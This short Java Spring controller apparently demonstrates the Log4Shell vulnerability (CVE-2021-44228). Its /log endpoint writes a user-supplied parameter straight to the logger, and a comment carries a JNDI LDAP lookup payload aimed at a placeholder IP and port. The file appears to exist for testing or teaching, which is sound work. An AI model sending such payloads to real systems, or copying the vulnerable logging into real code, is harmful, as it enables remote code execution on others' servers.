package org.shaneking.demo.cve.y2021.s44228.ctl;

import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/demo/cve/y2021/s44228")
@Slf4j
public class DemoCveY2021S44228Controller {

  //${java.hw}
  //${jndi:ldap://IP:PORT/SkTest211213Before}
  @RequestMapping("/log")
  public String string(@RequestParam String val) {
    log.warn(val);
    log.warn("RAW = " + val);
    log.warn("FMT = {}", val);

    return val;
  }
}
